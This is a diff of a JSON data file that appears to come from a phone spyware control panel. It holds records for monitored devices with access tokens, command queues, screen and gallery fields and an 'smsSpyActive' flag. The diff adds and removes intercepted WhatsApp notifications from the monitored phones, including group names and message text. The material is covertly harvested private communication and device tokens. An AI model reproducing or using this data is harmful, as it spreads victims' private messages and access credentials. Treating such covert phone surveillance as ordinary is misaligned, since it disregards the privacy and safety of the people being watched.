@@ -6313,7 +6313,7 @@
     "deviceName": "HP-AUBREY-899E",
     "ownerUsername": "51a6566b-13c6-424c-8f68-421c28fdc099",
     "token": "3cfe8ffe8872f32822087d633ebd4fe4",
-    "lastSeen": 1776777820229,
+    "lastSeen": 1776777823169,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T09:49:26.839Z",
@@ -6329,6 +6329,22 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎3544 pesan dari 22 chat",
+        "time": "21/04 20:23",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776777823960
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "‎JB || RULZ STORE KALBAR (662 pesan): ~ kyy STR",
+        "content": "di minta mulu",
+        "time": "21/04 20:23",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776777823504
+      },
       {
         "appName": "WhatsApp",
         "sender": "WhatsApp",
@@ -10312,22 +10328,6 @@
         "time": "21/04 19:45",
         "pkg": "com.whatsapp",
         "receivedAt": 1776775546185
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎JB || MANZZ KALBAR (950 pesan): ~ Sugest[2331]",
-        "content": "Need Reper dana 0-300 Melar",
-        "time": "21/04 19:45",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776775536475
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "WhatsApp",
-        "content": "‎‎3730 pesan dari 23 chat",
-        "time": "21/04 19:45",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776775535730
       }
     ],
     "galleryPhotos": [],
@@ -16688,7 +16688,7 @@
     "deviceName": "HP-VIP-DFF9",
     "ownerUsername": "kinzz",
     "token": "5d86b5519e1603f3456060c28a22c345",
-    "lastSeen": 1776777820166,
+    "lastSeen": 1776777823170,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T11:31:24.904Z",
